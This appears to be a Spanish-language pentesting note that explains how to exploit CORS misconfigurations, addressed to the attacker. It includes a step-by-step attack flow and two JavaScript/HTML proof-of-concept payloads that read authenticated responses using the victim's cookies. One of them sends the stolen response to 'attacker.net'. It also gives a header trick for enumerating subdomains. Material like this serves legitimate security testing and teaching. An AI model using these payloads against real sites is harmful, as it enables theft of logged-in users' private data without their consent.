CORS (_Intercambio de recursos de origen cruzado_/_Cross-Origin Resource Sharing_) aparece cuando el backend confia en un dominio o url que no deberia, permitiendo que otra web robe tus datos utilizando credenciales del usuario.

CORS controla que sitios pueden hacer solicitudes al backend con las cookies del usuario.

**El ataque es al usuario**

---
## ✔ Flujo real del ataque CORS

1. El **usuario** está logueado en `https://victima.com`  
    (tiene cookies válidas: `session=abcd1234`).
    
2. Vos (atacante) le mandás un link a tu página:  
    `http://evil.com`
    
3. La víctima abre tu página → tu JS corre.

---
_1ro_: Encuentro en una pagina que si pongo en el header: 

```
Origin:evil.com
``` 

devuelve 

```
Access-Control-Allow-Origin: http://evil.com
```

---
_2do_: Levanto pagina web con recurso JS/HTML:

```JavaScript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

o:

```HTML
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration

---
_3ro_: Envio link de la pagina a usuario victima (con cookies registradas)

---
---
---
---
#### Tambien...
Si vemos que tenemos bloqueada la enumeracion de subdominios, o no nos deja fuzzear por lo q sea, podemos agregar la siguiente linea al header, y si el dominio esta en una whitelist, quizas te deja enumerar subdominios:

```
Origin:https://subdominio.url.com
```

De modo que si vemos la siguiente linea en la respuesta, podemos enumerar subdominios:

```
Access-Control-Allow-Origin: https://subdominio.url.com
```

